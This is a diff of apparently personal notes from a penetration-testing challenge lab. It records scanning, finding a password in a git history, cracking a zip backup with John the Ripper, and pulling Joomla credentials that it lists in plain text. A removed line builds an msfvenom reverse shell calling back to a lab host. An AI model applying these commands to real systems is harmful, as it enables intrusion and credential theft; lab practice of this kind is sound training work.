@@ -95,7 +95,7 @@ psql -h 192.168.193.143 -p 5432 -d postgres -U support
 .144
 ```
 nmap 192.168.193.144
-nmap -sT -A -Pn -p 80 192.168.193.143
+nmap -sT -A -Pn -p 80 192.168.193.144
 gobuster dir -u http://192.168.193.144 -w /usr/share/wordlists/dirb/big.txt
 # find that it is running joomla CMS
 # also find a git repo that includes a security update
@@ -109,9 +109,24 @@ git show # reveal password
 # username: stuart@challenge.lab
 # password: BreakingBad92
 ftp stuart@192.168.193.144
-> binary
-> passive (turn it off)
-> ls
-# try reverse shell
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.219 LPORT=9999 -f sh -o linux-shell
+
+# only the 3rd backup file can be read
+zip2john sitebackup3.zip > zip.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+# show passwords and unzip using password
+john --show zip.hash
+unzip -P codeblue sitebackup3.zip
+# there is an issue with unzipping so use another tool
+7z -pcodeblue x sitebackup3.zip 
+# check out configuration.php in the joomla output directory
+# obtain some creds
+user: joomla, password: Password@1
+secret: Ee24zIK4cDhJHL4H
+another user: chloe
+
+# no worky
+ssh joomla@192.168.193.144
+ftp joomla@192.168.193.144
+
+nmap -p 80 1000-10000 192.168.193.144
 ```
